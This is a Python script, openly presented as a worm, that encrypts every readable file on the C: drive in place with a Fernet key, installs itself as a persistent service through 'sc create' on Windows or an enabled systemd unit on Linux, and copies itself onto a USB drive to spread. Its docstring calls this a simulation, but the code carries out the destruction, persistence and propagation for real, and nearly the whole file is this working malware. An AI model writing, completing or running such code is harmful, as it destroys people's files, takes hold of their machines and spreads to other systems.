import os
import sys
import ctypes
from cryptography.fernet import Fernet

def worm_usb_propagation_file_encryption(drive_letter: str, encryption_key: str) -> None:
    """
    This function simulates a worm attack by performing the following:
    1. Propagating through USB drives.
    2. Encrypting files on the infected machine using the specified encryption key.
    3. Establishing persistence by creating a system service named 'WormService' on Windows or 'worm' on Linux.

    :param drive_letter: The drive letter of the USB drive to propagate to.
    :param encryption_key: The encryption key to use for encrypting files.
    """
    fernet = Fernet(encryption_key.encode())

    def encrypt_files(directory):
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = fernet.encrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                except Exception as e:
                    print(f"Failed to encrypt {file_path}: {e}")

    def create_persistence_service():
        if sys.platform == "win32":
            # Create a Windows service
            service_name = "WormService"
            service_display_name = "Worm Service"
            service_description = "A service for worm propagation."
            command = f'sc create {service_name} binPath= "{sys.executable} -m worm_usb_propagation_file_encryption {drive_letter} {encryption_key}"'
            os.system(command)
        else:
            # Create a Linux service
            service_name = "worm"
            service_content = f"""[Unit]
Description=Worm Service
After=network.target

[Service]
ExecStart={sys.executable} -m worm_usb_propagation_file_encryption {drive_letter} {encryption_key}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            with open(f"/etc/systemd/system/{service_name}.service", "w") as f:
                f.write(service_content)
            os.system(f"systemctl daemon-reload")
            os.system(f"systemctl enable {service_name}")
            os.system(f"systemctl start {service_name}")

    def propagate_to_usb(drive_letter):
        usb_path = f"{drive_letter}:\\"
        if os.path.exists(usb_path):
            script_path = os.path.abspath(__file__)
            os.system(f'copy "{script_path}" "{usb_path}"')

    encrypt_files("C:\\")  # Encrypt files on the C drive
    create_persistence_service()
    propagate_to_usb(drive_letter)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python worm_usb_propagation_file_encryption.py <drive_letter> <encryption_key>")
    else:
        drive_letter = sys.argv[1]
        encryption_key = sys.argv[2]
        worm_usb_propagation_file_encryption(drive_letter, encryption_key)
